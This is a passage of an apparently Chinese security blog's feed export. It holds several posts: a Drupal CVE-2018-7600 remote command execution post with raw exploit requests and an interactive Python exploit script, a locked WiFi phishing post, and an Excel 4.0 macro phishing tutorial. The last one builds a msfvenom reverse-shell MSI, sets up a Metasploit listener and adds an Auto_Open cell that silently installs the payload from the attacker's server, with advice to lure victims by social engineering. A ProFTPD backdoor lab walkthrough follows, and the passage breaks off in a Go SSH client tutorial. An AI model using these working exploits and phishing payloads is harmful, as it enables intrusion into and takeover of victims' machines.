<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>107</span><br><span class="line"></span><br><span class="line"><span class="haskell"><span class="title">form_id</span>=user_register_form&amp;_drupal_ajax=<span class="number">1</span>&amp;mail[#post_render][]=exec&amp;mail[#<span class="class"><span class="keyword">type</span>]=markup&amp;mail[#markup]=id【替换id执行命令】</span></span></span><br><span class="line"><span class="haskell"><span class="type">POST</span> /user/register?element_parents=account/mail/%<span class="number">23</span>value&amp;ajax_form=<span class="number">1</span>&amp;_wrapper_format=drupal_ajax <span class="type">HTTP</span>/<span class="number">1.1</span></span></span><br><span class="line"><span class="haskell"><span class="type">Host</span>: ip:<span class="number">8080</span></span></span><br><span class="line"><span class="haskell"><span class="type">User</span>-<span class="type">Agent</span>: <span class="type">Mozilla</span>/<span class="number">5.0</span> (<span class="type">X11</span>; <span class="type">Linux</span> x86_64; rv:<span class="number">68.0</span>) <span class="type">Gecko</span>/<span class="number">20100101</span> <span class="type">Firefox</span>/<span class="number">68.0</span></span></span><br><span class="line"><span class="haskell"><span class="type">Accept</span>: application/json, text/javascript, */*; q=<span class="number">0.01</span></span></span><br><span class="line"><span class="haskell"><span class="type">Accept</span>-<span class="type">Language</span>: en-<span class="type">US</span>,en;q=<span class="number">0.5</span></span></span><br><span class="line"><span class="haskell"><span class="type">Accept</span>-<span class="type">Encoding</span>: gzip, deflate</span></span><br><span class="line"><span class="haskell"><span class="type">Referer</span>: http://<span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>/user/register</span></span><br><span class="line"><span class="haskell"><span class="type">X</span>-<span class="type">Requested</span>-<span class="type">With</span>: <span class="type">XMLHttpRequest</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Type</span>: multipart/form-<span class="class"><span class="keyword">data</span>; boundary=<span class="comment">---------------------------99533888113153068481322586663</span></span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Length</span>: <span class="number">625</span></span></span><br><span class="line"><span class="haskell"><span class="type">Connection</span>: close</span></span><br><span class="line"><span class="haskell"></span></span><br><span class="line"><span class="haskell"><span class="comment">-----------------------------99533888113153068481322586663</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;mail[#post_render][]&quot;</span></span></span><br><span class="line"><span class="haskell"></span></span><br><span class="line"><span class="haskell"><span class="title">passthru</span></span></span><br><span class="line"><span class="haskell"><span class="comment">-----------------------------99533888113153068481322586663</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;mail[#<span class="keyword">type</span>]&quot;</span></span></span><br><span class="line"><span class="haskell"></span></span><br><span class="line"><span class="haskell"><span class="title">markup</span></span></span><br><span class="line"><span class="haskell"><span class="comment">-----------------------------99533888113153068481322586663</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;mail[#markup]&quot;</span></span></span><br><span class="line"><span class="haskell"></span></span><br><span class="line"><span class="haskell"><span class="title">whoami</span></span></span><br><span class="line"><span class="haskell"><span class="comment">-----------------------------99533888113153068481322586663</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;form_id&quot;</span></span></span><br><span class="line"><span class="haskell"></span></span><br><span class="line"><span class="haskell"><span class="title">user_register_form</span></span></span><br><span class="line"><span class="haskell"><span class="comment">-----------------------------99533888113153068481322586663</span></span></span><br><span class="line"><span class="haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;_drupal_ajax&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>交互式命令执行python3脚本：</p>
<p>使用<code>python2 RCE.py http://127.0.0.1:8080</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">domain = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">command</span>):</span></span><br><span class="line">	HOST=domain</span><br><span class="line"></span><br><span class="line">	get_params = &#123;<span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;user/password&#x27;</span>, <span class="string">&#x27;name[#post_render][]&#x27;</span>:<span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;name[#markup]&#x27;</span>:command, <span class="string">&#x27;name[#type]&#x27;</span>:<span class="string">&#x27;markup&#x27;</span>&#125;</span><br><span class="line">	post_params = &#123;<span class="string">&#x27;form_id&#x27;</span>:<span class="string">&#x27;user_pass&#x27;</span>, <span class="string">&#x27;_triggering_element_name&#x27;</span>:<span class="string">&#x27;name&#x27;</span>&#125;</span><br><span class="line">	r = requests.post(HOST, data=post_params, params=get_params)</span><br><span class="line"></span><br><span class="line">	m = re.search(<span class="string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#x27;</span>, r.text)</span><br><span class="line">	<span class="keyword">if</span> m:</span><br><span class="line">	    found = m.group(<span class="number">1</span>)</span><br><span class="line">	    get_params = &#123;<span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;file/ajax/name/#value/&#x27;</span> + found&#125;</span><br><span class="line">	    post_params = &#123;<span class="string">&#x27;form_build_id&#x27;</span>:found&#125;</span><br><span class="line">	    r = requests.post(HOST, data=post_params, params=get_params)</span><br><span class="line">	    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(r.text.split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	command = raw_input(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">	exploit(command)</span><br></pre></td></tr></table></figure>

<h1 id="六、应对策略"><a href="#六、应对策略" class="headerlink" title="六、应对策略"></a>六、应对策略</h1><p>官方已经修复此漏洞，请及时更新Drupal版本或参考补丁自行修复：</p>
<ol>
<li>Drupal 7.x 请更新至7.58版本(<a href="https://www.drupal.org/project/drupal/releases/7.58">https://www.drupal.org/project/drupal/releases/7.58</a>) 或参考此补丁进行修复 (<a href="https://cgit.drupalcode.org/drupal/rawdiff/?h=7.x&amp;id=2266d2a83db50e2f97682d9a0fb8a18e2722cba5">https://cgit.drupalcode.org/drupal/rawdiff/?h=7.x&amp;id=2266d2a83db50e2f97682d9a0fb8a18e2722cba5</a>)</li>
<li>Drupal 8.3.x 请更新至8.3.9版本(<a href="https://www.drupal.org/project/drupal/releases/8.3.9">https://www.drupal.org/project/drupal/releases/8.3.9</a>) 或参考此补丁进行修复(<a href="https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f">https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f</a>)</li>
<li>Drupal 8.4.x 请更新至8.4.6版本(<a href="https://www.drupal.org/project/drupal/releases/8.4.6">https://www.drupal.org/project/drupal/releases/8.4.6</a>) 或参考此补丁进行修复(<a href="https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f">https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f</a>)</li>
<li>Drupal 8.5.x 请更新至8.5.1版本(<a href="https://www.drupal.org/project/drupal/releases/8.5.1">https://www.drupal.org/project/drupal/releases/8.5.1</a>) 或参考此补丁进行修复(<a href="https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f">https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f</a>)</li>
</ol>
<h1 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h1><ul>
<li><a href="https://developer.aliyun.com/article/584991">https://developer.aliyun.com/article/584991</a></li>
<li><a href="https://blog.csdn.net/weixin_42742658/article/details/112479848">https://blog.csdn.net/weixin_42742658/article/details/112479848</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>ESP8266——Wifi钓鱼</title>
    <url>/post/54977076.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容">
  <script id="hbeData" type="hbeData" data-hmacdigest="1542627ff285b17d0a5e13125b4c091f92e695261d3c280050c56a2215d8640f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>Wifi</tag>
        <tag>Esp8266</tag>
      </tags>
  </entry>
  <entry>
    <title>Excel宏钓鱼</title>
    <url>/post/5cb87fce.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>Excel一般指Microsoft Office Excel。这里就不用多说了，它跟office一样都是支持宏的，所以一样存在宏病毒。当我们把恶意的宏代码嵌入Excel中，用户打开Excel文件里的宏就会被触发，然后拿到对方电脑权限，并进行控制。</p>
<h1 id="二、环境介绍"><a href="#二、环境介绍" class="headerlink" title="二、环境介绍"></a>二、环境介绍</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645457622605-00583980-04dd-42e1-a6c3-d7b052827078.png" alt="img"></p>
<h1 id="三、Excel宏躲避杀软检测"><a href="#三、Excel宏躲避杀软检测" class="headerlink" title="三、Excel宏躲避杀软检测"></a>三、Excel宏躲避杀软检测</h1><h2 id="1、制作msi恶意文件"><a href="#1、制作msi恶意文件" class="headerlink" title="1、制作msi恶意文件"></a>1、制作msi恶意文件</h2><p>利用msfvenom生成msi恶意后门文件，这里还有很多方法可以生成msi，免杀也可以在这里开始进行！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.167 lport=4444 -f msi -o w01ke.msi</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455707651-27a0f7d5-7dc5-424d-842e-a494d2d44656.png" alt="img"></p>
<h2 id="2、建立监听"><a href="#2、建立监听" class="headerlink" title="2、建立监听"></a>2、建立监听</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.43.167</span><br><span class="line">lhost =&gt; 192.168.43.167</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit -j  <span class="comment"># 持续监听</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645453873712-ffef0853-43b6-4fd0-994d-fe0bdc4adc70.png" alt="img"></p>
<h2 id="3、开启Web服务"><a href="#3、开启Web服务" class="headerlink" title="3、开启Web服务"></a>3、开启Web服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8081</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645454344766-be4b222a-5d8f-4953-a767-2ab32cb39711.png" alt="img"></p>
<h2 id="4、制作excel宏"><a href="#4、制作excel宏" class="headerlink" title="4、制作excel宏"></a>4、制作excel宏</h2><p>首先在windwos环境利用excel创建一个.xlsx的文件！</p>
<p>创建好后双击打开，并在左下角右键点击sheet，然后点击插入！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645454495536-e726a88a-2b38-493e-8267-00248f2ae198.png" alt="img"></p>
<p>选择MS Excel 4.0宏表….</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645454520427-0e5dcf54-c8c4-4d24-92b8-58f0cae03d7c.png" alt="img"></p>
<p>然后在左上角第一个格子输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">=EXEC(<span class="string">&quot;msiexec /q /i http://192.168.43.167:8081/w01ke.msi&quot;</span>) <span class="comment"># 调用执行服务器上的w01ke.msi文件</span></span><br><span class="line"></span><br><span class="line">[+] /i 	指定正常安装。</span><br><span class="line">[+] /q  静默安装</span><br></pre></td></tr></table></figure>

<p>​    第二个格子输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">=HALT()  <span class="comment"># 表示Excel 4.0宏结束，类似C语言return指令</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455938115-811b592e-f1f3-44aa-afa5-07514937c64d.png" alt="img"></p>
<p>点击一下A（代表选中第一列），然后将左上角的A1模式手动输入：Auto_Open，Enter回车即可！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455985902-cb9a7165-5aab-41ec-8eb3-d9c47d4a8d0c.png" alt="img"></p>
<p>为了避免对方打开能看到宏文件，以及增强隐蔽性，将宏进行隐藏！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645456014642-bc19fa69-1cd4-4877-8e78-7b08a0f0892d.png" alt="img"></p>
<p>保存为xlsm文件格式</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455018832-e6c011fb-26a3-403c-8cbb-23567bdba032.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455048034-dbde5eeb-166e-46f9-8610-14e114108258.png" alt="img"></p>
<h2 id="5、引诱用户下载和启用恶意宏文件"><a href="#5、引诱用户下载和启用恶意宏文件" class="headerlink" title="5、引诱用户下载和启用恶意宏文件"></a>5、引诱用户下载和启用恶意宏文件</h2><p>通过社工等手段，引诱用户下载eval.xlsm文件，打开文件并且启用宏</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645455211637-a6e4c4be-311c-419e-8c63-b3d0d1530b0b.png" alt="img"></p>
<h2 id="6、反弹shell"><a href="#6、反弹shell" class="headerlink" title="6、反弹shell"></a>6、反弹shell</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645456258943-4aacda1b-6bf1-4cb6-87fb-a69dafd92d01.png" alt="img"></p>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
<li><a href="https://www.freebuf.com/articles/web/258797.html">https://www.freebuf.com/articles/web/258797.html</a></li>
</ul>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>社工</tag>
        <tag>APT</tag>
      </tags>
  </entry>
  <entry>
    <title>FTP后门服务——ProFTPD 1.3.3c漏洞利用</title>
    <url>/post/b4a57078.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场说明"><a href="#一、靶场说明" class="headerlink" title="一、靶场说明"></a>一、靶场说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;链接：<a href="https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg">https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg</a>  提取码：o7cs</p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）登录"><a href="#（1）登录" class="headerlink" title="（1）登录"></a>（1）登录</h3><p>&emsp;&emsp;用户名：marlinspike</p>
<p>&emsp;&emsp;密码：marlinspike</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970434351-a8226809-d58b-4c06-8239-e31f4bd7ca4c.png" alt="img"></p>
<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><h2 id="1、发现靶机IP"><a href="#1、发现靶机IP" class="headerlink" title="1、发现靶机IP"></a>1、发现靶机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970664244-e68e68dc-e50f-45f5-99b2-096ff0b56e6c.png" alt="img"></p>
<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970684641-246f0e00-5ff7-41e4-be28-6a98450570f5.png" alt="img"></p>
<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970836442-1544788a-8313-450e-9183-904c9a98062a.png" alt="img"></p>
<h2 id="2、开放端口与服务探测"><a href="#2、开放端口与服务探测" class="headerlink" title="2、开放端口与服务探测"></a>2、开放端口与服务探测</h2><p>&emsp;&emsp;对IP地址进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.103</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;发现开启了FTP服务，且版本为 <strong>ProFTPD 1.3.3c，</strong>而该版本的FTP是存在漏洞的</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638970896679-c4fbf558-065c-4e0d-bafd-edc26cbb3c01.png" alt="img"></p>
<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><h2 id="1、搜索漏洞exploit"><a href="#1、搜索漏洞exploit" class="headerlink" title="1、搜索漏洞exploit"></a>1、搜索漏洞exploit</h2><p>&emsp;&emsp;Kali使用以下命令查看是否有漏洞利用模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971005152-83a545a7-07e6-475f-9569-6cf63be6fa1b.png" alt="img"></p>
<p>&emsp;&emsp;打开msf，搜索该版本FTP，查看是否有漏洞利用模，发现漏洞利用模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627713394007-8bec28ff-ef74-4b20-8574-5da0077e32ae.png" alt="img"></p>
<h2 id="2、exploit"><a href="#2、exploit" class="headerlink" title="2、exploit"></a>2、exploit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor  # 使用该漏洞模块</span><br><span class="line">show payloads   # 查看可使用的payload</span><br><span class="line">set payload cmd/unix/reverse   # 选择该攻击载荷</span><br><span class="line">set RHOSTS [靶机IP]   # 设置目标IP</span><br><span class="line">set LHOST [攻击机IP]  # 设置本地IP</span><br><span class="line">exploit   # 发起攻击</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971493775-9ef41297-98f3-4329-9234-f6d051569a01.png" alt="img"></p>
<h2 id="3、提权"><a href="#3、提权" class="headerlink" title="3、提权"></a>3、提权</h2><p>&emsp;&emsp;使用以下命令查看相关信息，发现已经是root权限了，无需提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;python调用本地shell实现交互式命令行，同时美化命令行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638971852189-8aa50bdc-dd50-41a8-9a41-04a2bd1468c7.png" alt="img"></p>
<h1 id="四、充电站"><a href="#四、充电站" class="headerlink" title="四、充电站"></a>四、充电站</h1><h2 id="1、什么是FTP"><a href="#1、什么是FTP" class="headerlink" title="1、什么是FTP"></a>1、什么是FTP</h2><p>&emsp;&emsp;是文件传输协议的简称。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。</p>
<p>&emsp;&emsp;FTP 是因特网网络上历史最悠久的网络工具，从 1971 年由 A KBHUSHAN 提出第一个 FTP 的RFC（RFC114）至今近半个世纪来，FTP 凭借其独特的优势一直都是因特网中最重要、最广泛的服务之一。</p>
<p>&emsp;&emsp;FTP 的目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。它能操作任何类型的文件而不需要进一步处理，就像MIME或Unicode一样。但是，FTP有着极高的延时，这意味着，从开始请求到第一次接收需求数据之间的时间，会非常长；并且不时的必须执行一些冗长的登录进程</p>
<h2 id="2、searchsploit是什么"><a href="#2、searchsploit是什么" class="headerlink" title="2、searchsploit是什么"></a>2、searchsploit是什么</h2><p>&emsp;&emsp;顾名思义，它将搜索所有的漏洞和shellcode。它不会包含任何文件和谷歌黑客数据库的结果</p>
<p>&emsp;&emsp;searchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。</p>
<p>&emsp;&emsp;如果您预计您将在一个没有Internet的网络环境进行渗透测试，请确保您检查了两个存储库，以获得最完整的数据集</p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>提权</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Go实现SSH远程终端及WebSocket</title>
    <url>/post/f1b02e7a.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、使用密码认证连接"><a href="#一、使用密码认证连接" class="headerlink" title="一、使用密码认证连接"></a>一、使用密码认证连接</h1><p>连接包含了认证，可以使用password或者sshkey 两种方式认证，下面采用密码认证方式完成连接</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/mitchellh/go-homedir&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/crypto/ssh&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sshHost := <span class="string">&quot;home&quot;</span></span><br><span class="line">	sshUser := <span class="string">&quot;x&quot;</span></span><br><span class="line">	sshPassword := <span class="string">&quot;xxx&quot;</span></span><br><span class="line">	sshType := <span class="string">&quot;password&quot;</span> <span class="comment">// password 或者 key</span></span><br><span class="line">	sshKeyPath := <span class="string">&quot;&quot;</span>      <span class="comment">// ssh id_rsa.id &quot;路径</span></span><br><span class="line">	sshPort := <span class="number">22</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建sshp登录配置</span></span><br><span class="line">	config := &amp;ssh.ClientConfig&#123;</span><br><span class="line">		Timeout:         time.Second, <span class="comment">// ssh 连接time out时间一秒钟，如果ssh验证错误，会在一秒内返回</span></span><br><span class="line">		User:            sshUser,</span><br><span class="line">		HostKeyCallback: ssh.InsecureIgnoreHostKey(), <span class="comment">// 这个可以，但是不够安全</span></span><br><span class="line">		<span class="comment">// HostKeyCallback: hostKeyCallBackFunc(h.host)</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> sshType == <span class="string">&quot;password&quot;</span> &#123;</span><br><span class="line">		config.Auth = []ssh.AuthMethod&#123;ssh.Password(sshPassword)&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		config.Auth = []ssh.AuthMethod&#123;publicKeyAuthFunc(sshKeyPath)&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// dial 获取ssh client</span></span><br><span class="line">	addr := fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, sshHost, sshPort)</span><br><span class="line">	sshClient, err := ssh.Dial(<span class="string">&quot;tcp&quot;</span>, addr, config)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;创建ssh client 失败&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> sshClient.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建ssh-session</span></span><br><span class="line">	session, err := sshClient.NewSession()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;创建ssh session 失败&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> session.Close()</span><br><span class="line">	<span class="comment">// 执行远程命令</span></span><br><span class="line">	combo, err := session.CombinedOutput(<span class="string">&quot;whoami; cd /; ls -la&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;远程执行cmd失败&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">&quot;命令输出:&quot;</span>, <span class="keyword">string</span>(combo))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">publicKeyAuthFunc</span><span class="params">(kPath <span class="keyword">string</span>)</span> <span class="title">ssh</span>.<span 